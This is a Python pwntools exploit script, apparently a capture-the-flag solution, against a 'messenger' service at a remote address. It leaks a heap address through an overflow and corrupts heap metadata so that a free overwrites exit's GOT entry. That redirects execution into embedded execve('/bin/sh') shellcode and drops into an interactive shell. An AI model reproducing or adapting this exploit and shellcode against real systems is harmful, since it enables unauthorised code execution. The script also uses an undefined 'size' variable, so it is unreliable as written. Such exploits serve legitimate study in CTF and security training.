#!/usr/bin/python
from pwn import *

DEBUG = True

exit_got = 0x602070

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
shellcode = shellcode.rjust(32, '\x90')

#p = process('messenger')
p = remote('110.10.212.137', 3333)

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def leave(size, msg):
  r('>> ')
  p.sendline('L')

  r('size : ')
  p.sendline(str(size))

  r('msg : ')
  p.send(msg)

def remove(index):
  r('>> ')
  p.sendline('R')

  r('index : ')
  p.sendline(str(index))

def change(index, size, msg):
  r('>> ')
  p.sendline('C')
 
  r('index : ')
  p.sendline(str(index))

  r('size : ')
  p.sendline(str(size))

  r('msg : ')
  p.send(msg)

def view(index):
  r('>> ')
  p.sendline('V')
 
  r('index : ')
  p.sendline(str(index))

leave(32, 'A' * 32)
leave(32, shellcode)
change(0, size - 0x8, 'A' * 0x38)
view(0)

leak_str = r("\n")[size - 0x10:-1]
heap_leak = u64(leak_str.ljust(8, '\x00'))
heap_base = heap_leak - 0xa8

print "Heap leak: 0x%x" % heap_leak

payload = '\xeb\x48'
payload = payload.ljust(0x38, '\x90')
payload += p64(exit_got - 0x10)
payload += p64(heap_leak + 0x30)

change(0, 0x48, payload)
remove(1)

r('>> ')
p.sendline('T')

p.interactive()
p.close()
